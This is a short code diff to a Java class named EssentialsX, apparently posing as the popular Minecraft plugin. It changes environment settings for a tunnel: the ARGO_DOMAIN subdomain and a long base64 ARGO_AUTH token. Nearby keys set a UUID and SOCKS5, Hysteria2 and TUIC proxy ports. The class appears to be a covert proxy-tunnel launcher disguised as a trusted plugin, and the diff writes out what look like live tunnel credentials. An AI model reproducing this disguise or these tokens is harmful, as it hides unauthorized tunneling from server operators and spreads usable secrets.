@@ -76,8 +76,8 @@ public class EssentialsX extends JavaPlugin {
         env.put("UUID", "50435f3a-ec1f-4e1a-867c-385128b447f8");
         env.put("FILE_PATH", "./world");
         env.put("ARGO_PORT", "8001");
-        env.put("ARGO_DOMAIN", "freemc.host.zdsas.cyou");
-        env.put("ARGO_AUTH", "eyJhIjoiMmY2ZTllNjhmNDk2NTBjMGFjMzQ3OTkzMDE0NDRkNGQiLCJ0IjoiODk2NDY0Y2ItOWMzYS00YjIxLTkwNjQtNGVmYjVkNGRjOWMxIiwicyI6Ik1qZzNObVJoWmprdE1UUTJNeTAwWTJFMkxXRm1aR0V0WlRrME9HWmlOVGhqTm1JeiJ9");
+        env.put("ARGO_DOMAIN", "cline.zdsas.cyou");
+        env.put("ARGO_AUTH", "eyJhIjoiMmY2ZTllNjhmNDk2NTBjMGFjMzQ3OTkzMDE0NDRkNGQiLCJ0IjoiOGI2OTAzY2YtNGViNi00YTM1LTkwZmMtNTZjNWE4OTJjY2ZlIiwicyI6Ik5UaGpaVGd4WW1RdFpUVTFPUzAwTURrMUxUaGxPVFV0WTJNM05qZzBPVFJoWkdWalltSXpOamRqWkRNdE5Ea3hOQzAwWkRnMExXRmhNalV0TkRKalpEVTNNV0l4T1RnMCJ9");
         env.put("S5_PORT", "");
         env.put("HY2_PORT", "");
         env.put("TUIC_PORT", "");
